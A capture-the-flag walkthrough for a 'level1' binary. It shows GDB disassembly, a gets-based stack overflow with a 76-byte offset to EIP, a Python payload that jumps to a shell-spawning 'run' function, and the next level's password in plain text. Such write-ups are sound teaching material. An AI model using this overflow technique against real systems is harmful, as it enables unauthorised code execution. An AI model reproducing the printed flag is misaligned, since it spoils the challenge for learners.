# Level 1 Walkthrough

## Initial Analysis
1. Log into the `level1` account and copy the ELF locally.
2. Use GDB (with GEF or pwndbg) to inspect the stack setup.

```bash
$ gdb ./level1
gef➤ b *main
gef➤ r
gef➤ x/10i $eip
```

### Main Function Disassembly
```asm
0x8048480 <main>:    push   ebp
0x8048481 <main+1>:  mov    ebp, esp
0x8048483 <main+3>:  and    esp, 0xfffffff0
0x8048486 <main+6>:  sub    esp, 0x50          ; 80 bytes stack frame
0x8048489 <main+9>:  lea    eax, [esp+0x10]     ; buffer pointer
0x804848d <main+13>: mov    dword ptr [esp], eax
0x8048490 <main+16>: call   gets@plt            ; unbounded read
```
Observations:
- The usable buffer size is `0x50 - 0x10 = 0x40` (64 bytes).
- Because `gets` never checks bounds, anything beyond 64 bytes begins to smash saved registers.

## Exploitation Process

### 1. Measure the Offset
Use `pattern create 200` (GEF) or `pwntools.cyclic` and crash the program. `pattern search $eip` reports that EIP is overwritten after 76 bytes, confirming the theoretical calculation (64 bytes buffer + saved EBP + alignment).

### 2. Identify the Win Function
A quick `info functions` shows an extra symbol `run` at `0x8048444`. Disassembly:
```asm
run:
  push   ebp
  mov    ebp, esp
  sub    esp, 0x18
  fwrite("Good... Wait what?\n", 1, 0x13, stdout);
  system("/bin/sh");
  leave
  ret
```
Jumping there is ideal because it already spawns a shell.

### 3. Craft the Payload
```
payload = b"A" * 76 + p32(0x8048444)
```
Pipe it into the binary or send via a pwntools script.

### 4. Grab the Flag
Once `run` executes, we land in a shell running as `level2`.
```bash
$ (python3 -c 'import sys,struct; sys.stdout.buffer.write(b"A"*76 + struct.pack("<I", 0x8048444))') | ./level1
$ cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

## Summary
1. Vulnerability: stack buffer overflow via `gets`.
2. Offset to EIP: 76 bytes.
3. Redirect execution to `run()` at `0x8048444`.
4. Shell → read the next password.
